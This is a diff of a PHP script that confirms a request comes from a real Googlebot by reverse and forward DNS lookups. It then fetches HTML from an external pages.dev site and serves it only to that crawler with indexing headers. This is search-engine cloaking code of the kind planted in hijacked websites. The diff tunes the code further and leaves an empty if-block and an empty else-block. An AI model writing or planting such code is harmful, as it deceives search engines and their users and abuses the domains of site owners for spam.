@@ -39,27 +39,35 @@ function is_google_bot(): bool
 function is_real_googlebot(): bool
 {
     $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
     if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
         return false;
     }
 
-    $hostname = gethostbyaddr($ip);
-    if ($hostname === false || $hostname === $ip) {
+    $hostname = @gethostbyaddr($ip);
+    if ($hostname === false || $hostname === $ip || $hostname === '') {
         return false;
     }
 
-    // Harus berakhiran .googlebot.com atau .google.com (dengan titik)
     $hostname = strtolower($hostname);
+
     $isGoogleHost = (substr($hostname, -13) === '.googlebot.com')
+                 || (substr($hostname, -17) === '.geo.googlebot.com')
                  || (substr($hostname, -11) === '.google.com');
 
     if (!$isGoogleHost) {
         return false;
     }
 
-    // Forward-confirm: IP hasil resolve hostname harus sama dengan IP asal
     $resolved = gethostbyname($hostname);
-    return $resolved === $ip;
+    if ($resolved !== $ip) {
+        return false;
+    }
+
+    if (function_exists('is_googlebot_ip_range') && !is_googlebot_ip_range($ip)) {
+    }
+
+    return true;
 }
 
 function is_curl_available(): bool
@@ -67,12 +75,8 @@ function is_curl_available(): bool
     return function_exists('curl_init') && function_exists('curl_exec');
 }
 
-/**
- * Ambil konten dari URL dengan fallback.
- */
 function get_content_fallback(string $url): ?string
 {
-    // Validasi skema URL
     $scheme = parse_url($url, PHP_URL_SCHEME);
     if (!in_array($scheme, ['http', 'https'], true)) {
         return null;
@@ -113,12 +117,11 @@ if (is_google_bot() && is_real_googlebot()) {
     if ($shouldServeContent) {
         $botContent = get_content_fallback('https://reumatismo-org.pages.dev/');
 
-        if ($botContent !== null) {
+        if ($botContent !== null && $botContent !== '') {
             header('Content-Type: text/html; charset=UTF-8');
             header('X-Robots-Tag: index, follow', true);
             echo $botContent;
         } else {
-            http_response_code(204);
         }
         exit;
     }
